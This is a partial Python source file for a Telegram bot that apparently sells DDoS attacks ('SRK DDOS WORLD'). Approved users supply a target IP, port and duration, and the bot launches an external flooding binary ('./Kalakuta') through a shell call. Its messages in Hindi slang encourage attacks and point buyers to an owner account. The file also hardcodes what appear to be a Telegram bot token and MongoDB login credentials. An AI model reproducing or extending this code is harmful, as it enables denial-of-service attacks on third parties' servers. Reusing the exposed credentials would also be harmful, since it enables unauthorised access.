...
TOKEN = '7719973366:AAFQA4pATt_Ihky8-q37hfiaTRPn-TzxORI'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID =  -1002322006686       #telegram mai group bana ke chat id dalo      
CHANNEL_ID = -1002322006686                    #telegram mai group bana ke chat id dalo      
error_channel_id = -1002322006686                #telegram mai group bana ke chat id dalo      
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./Kalakuta {target_ip} {target_port} {duration} 800")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 JAA PHLE APPROVE HOKE AA APNE PAPA SE *\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @OWNERSRK*", parse_mode='Markdown')  # Contact owner message
            return
        ...
        bot.send_message(chat_id, "*💣JALDI ATTACK MAAR BAHI KISI NE BHI NI LAGA RAKHA *\n"  # Ready to launch message
                                   ...
                                   "*OWNER @OWNERSRK🧛*", parse_mode='Markdown')  # Start chaos message
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*🚀PING DEKH NICHE 677 HOGYA !👻*\n\n"  # Attack launched message
                                           f"*TIME ==> {duration} seconds send feedback to @OWNERSRK🔥*", parse_mode='Markdown')  # Duration message
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @OWNERSRK* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @OWNERSRK 🙏"  # Contact owner message
    else:
...
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO SRK DDOS WORLD!* 🎉\n\n"
...
if __name__ == "__main__":
    ...
    logging.info("Bot started join @CONFIG OF SRK...")
    while True:
        try:
